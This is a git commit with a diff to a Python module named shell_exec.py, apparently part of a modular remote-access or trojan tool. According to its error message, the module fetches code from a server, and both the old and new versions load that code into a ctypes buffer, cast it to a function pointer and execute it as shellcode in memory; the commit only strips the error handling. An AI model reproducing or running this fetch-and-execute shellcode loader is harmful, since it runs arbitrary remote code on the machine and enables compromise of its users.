b9611c4eb572cfa832983469ff2d9425b2c1edbf
purple_racc00n <purple_rac00n@localhost.localdomain>
2016-09-07 20:24:17 +0200

    gg rekt m8

--- modules/shell_exec.py
+++ modules/shell_exec.py
@@ -13,14 +13,11 @@ def run(**args):
 	except:
 		print "There was a problem while trying to grab the code from the server, exiting module..."
 		return 0, "failed"
-	try:		
-		shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
-		shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
-		shellcode_func()
-		print "Shellcode executed."
-		return 0, "successfully"
-	except:
-		print "Could not execute the code, exiting module..."
-		return 0, "failed"
+	shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
+	shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
+	shellcode_func()
+	print "Shellcode executed."
+	return 0, "successfully"
+	
 	
 	
